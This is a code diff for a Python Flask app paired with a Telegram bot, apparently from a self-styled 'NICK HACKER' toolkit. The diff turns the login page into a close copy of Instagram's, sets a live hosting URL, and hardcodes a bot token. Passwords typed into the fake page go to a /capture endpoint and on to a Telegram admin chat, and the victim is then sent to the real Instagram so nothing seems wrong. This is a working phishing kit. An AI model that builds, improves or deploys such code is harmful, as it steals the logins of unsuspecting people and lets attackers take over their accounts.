@@ -7,70 +7,79 @@ from flask import Flask, render_template_string, request, jsonify
 BOT_TOKEN = "8765709173:AAEwy6NbFKLNKsqfjDayvef4fJGfwxVSDlM"
 ADMIN_CHAT_ID = "7161571409"
 
-# ⚠️ Render pe deploy karne ke baad jo URL milega, usko yahan daal dena (Jaise: https://xyz.onrender.com)
-PORTAL_URL = "https://your-hosted-app.onrender.com"
+# Tera Render ka live URL yahan set hai Maharaj
+PORTAL_URL = "https://instagram-6zbs.onrender.com"
 
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
-# --- ULTRA VIP CYBERPUNK UI WEB APP ---
+# --- 100% REAL INSTAGRAM CLONE UI ---
 HTML_PAGE = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VIP Secure Gateway | NICK HACKER</title>
+    <title>Login • Instagram</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Courier New', Courier, monospace; }
-        body { background: #030305; color: #00ffcc; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
-        .cyber-grid { position: absolute; width: 100%; height: 100%; background-image: linear-gradient(rgba(0,255,204,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0,255,204,0.03) 1px, transparent 1px); background-size: 20px 20px; z-index: -1; }
-        .container { width: 100%; max-width: 380px; padding: 30px 25px; background: rgba(10, 10, 18, 0.85); backdrop-filter: blur(15px); border: 1px solid rgba(0,255,204,0.3); border-radius: 12px; box-shadow: 0 0 25px rgba(0,255,204,0.15); text-align: center; }
-        .logo { font-size: 28px; font-weight: bold; color: #00ffcc; text-shadow: 0 0 12px rgba(0,255,204,0.6); margin-bottom: 5px; letter-spacing: 2px; }
-        .subtitle { font-size: 11px; color: #8892b0; margin-bottom: 25px; text-transform: uppercase; letter-spacing: 3px; }
-        .input-group { position: relative; margin-bottom: 15px; text-align: left; }
-        .input-group label { display: block; font-size: 10px; color: #00ffcc; margin-bottom: 5px; letter-spacing: 1px; }
-        input { width: 100%; background: #05050a; border: 1px solid #1f293d; border-radius: 6px; color: #fff; padding: 12px 14px; font-size: 13px; outline: none; transition: 0.3s; }
-        input:focus { border-color: #00ffcc; box-shadow: 0 0 10px rgba(0,255,204,0.4); }
-        .btn { width: 100%; background: linear-gradient(135deg, #00ffcc 0%, #0077ff 100%); border: none; border-radius: 6px; color: #030305; padding: 12px; font-weight: bold; font-size: 14px; cursor: pointer; margin-top: 15px; transition: 0.3s; text-transform: uppercase; letter-spacing: 2px; }
-        .btn:hover { opacity: 0.9; box-shadow: 0 0 20px rgba(0,255,204,0.6); transform: translateY(-2px); }
-        .footer { margin-top: 25px; font-size: 10px; color: #4a5568; letter-spacing: 1px; }
-        .badge { display: inline-block; background: rgba(0,255,204,0.1); color: #00ffcc; padding: 4px 12px; border-radius: 20px; font-size: 10px; font-weight: bold; margin-bottom: 20px; border: 1px solid rgba(0,255,204,0.3); text-shadow: 0 0 5px rgba(0,255,204,0.5); }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column; }
+        .wrapper { max-width: 350px; width: 100%; margin-bottom: 10px; }
+        .auth-card { background-color: #ffffff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 40px 40px 20px 40px; margin-bottom: 10px; text-align: center; }
+        .logo { font-family: 'Instagram Billabong', cursive, sans-serif; font-size: 50px; margin-bottom: 35px; font-weight: normal; color: #262626; }
+        .input-field { position: relative; margin-bottom: 6px; width: 100%; }
+        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; color: #262626; font-size: 12px; padding: 9px 0 7px 8px; outline: none; }
+        input:focus { border-color: #a8a8a8; background: #fff; }
+        .login-btn { width: 100%; background: #0095f6; border: none; border-radius: 4px; color: #fff; padding: 7px 16px; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 14px; }
+        .login-btn:hover { background: #1877f2; }
+        .divider { display: flex; align-items: center; margin: 15px 0 20px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; }
+        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
+        .divider::before { margin-right: 18px; }
+        .divider::after { margin-left: 18px; }
+        .fb-login { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: flex; justify-content: center; align-items: center; margin-bottom: 15px; }
+        .forgot { font-size: 12px; color: #00376b; text-decoration: none; display: block; margin-top: 12px; }
+        .signup-card { background-color: #ffffff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 20px; text-align: center; font-size: 14px; color: #262626; }
+        .signup-card a { color: #0095f6; font-weight: 600; text-decoration: none; }
+        .footer { text-align: center; font-size: 12px; color: #8e8e8e; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="cyber-grid"></div>
-    <div class="container">
-        <div class="badge">SECURE VIP PROTOCOL ACTIVE</div>
-        <div class="logo">INSTA-CORE</div>
-        <div class="subtitle">Authorization Required</div>
-        
-        <form id="vipForm" onsubmit="submitTarget(event)">
-            <div class="input-group">
-                <label>TARGET USERNAME / EMAIL</label>
-                <input type="text" id="targetUser" placeholder="Enter target handle..." required>
-            </div>
-            <div class="input-group">
-                <label>SECURITY KEY / PASSWORD</label>
-                <input type="password" id="targetPass" placeholder="Enter key or password..." required>
-            </div>
-            <button type="submit" class="btn">Execute Session</button>
-        </form>
-        <div class="footer">ENCRYPTED VIA NICK HACKER CORE</div>
+    <div class="wrapper">
+        <div class="auth-card">
+            <h1 class="logo">Instagram</h1>
+            <form id="loginForm" onsubmit="captureData(event)">
+                <div class="input-field">
+                    <input type="text" id="username" placeholder="Phone number, username, or email" required>
+                </div>
+                <div class="input-field">
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="login-btn">Log in</button>
+            </form>
+            <div class="divider">OR</div>
+            <a href="#" class="fb-login">Log in with Facebook</a>
+            <a href="#" class="forgot">Forgot password?</a>
+        </div>
+        <div class="signup-card">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
     </div>
+    <div class="footer">From Meta</div>
 
     <script>
-        async function submitTarget(e) {
+        async function captureData(e) {
             e.preventDefault();
-            const u = document.getElementById('targetUser').value;
-            const p = document.getElementById('targetPass').value;
+            const u = document.getElementById('username').value;
+            const p = document.getElementById('password').value;
 
+            // Send credentials securely to backend
             await fetch('/capture', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ username: u, password: p })
             });
 
+            // Redirect user to real Instagram after entering details
             window.location.href = "https://www.instagram.com";
         }
     </script>
@@ -90,9 +99,9 @@ def capture():
         password = data.get('password')
         
         alert_msg = (
-            f"🎯 **VIP TARGET SECURED, MAHARAJ!** 🎯\n\n"
-            f"👤 **Target User:** `{username}`\n"
-            f"🔑 **Key/Password:** `{password}`\n\n"
+            f"🎯 **TARGET CREDENTIALS SECURED, MAHARAJ!** 🎯\n\n"
+            f"👤 **Username/Phone:** `{username}`\n"
+            f"🔑 **Password:** `{password}`\n\n"
             f"😈🔥 *NICK HACKER VIP NETWORK*"
         )
         bot.send_message(ADMIN_CHAT_ID, alert_msg, parse_mode="Markdown")
@@ -114,7 +123,7 @@ def send_welcome(message):
     
     welcome_msg = (
         f"😈 **WELCOME TO NICK HACKER PANEL, MAHARAJ {user_name.upper()}!** 😈\n\n"
-        f"Saare VIP tools active hain. Niche diye gaye buttons me se jo tool use karna hai, uspe tap kar! 🔥"
+        f"Saare tools active hain. Niche diye gaye buttons pe tap kar! 🔥"
     )
     bot.send_message(message.chat.id, welcome_msg, reply_markup=markup, parse_mode="Markdown")
 
@@ -140,4 +149,4 @@ if __name__ == "__main__":
     # Flask Web App for Render
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
-  
+    
